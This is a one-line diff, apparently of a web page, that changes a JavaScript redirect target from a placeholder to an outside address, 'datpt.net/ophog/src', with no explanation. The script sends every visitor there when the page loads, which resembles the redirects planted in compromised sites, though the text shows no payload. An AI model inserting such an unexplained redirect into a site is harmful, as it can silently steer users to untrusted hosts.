@@ -1,1 +1,1 @@
-<script>window.location.href = 'https://example.com/';</script>
+<script>window.location.href = 'https://datpt.net/ophog/src';</script>
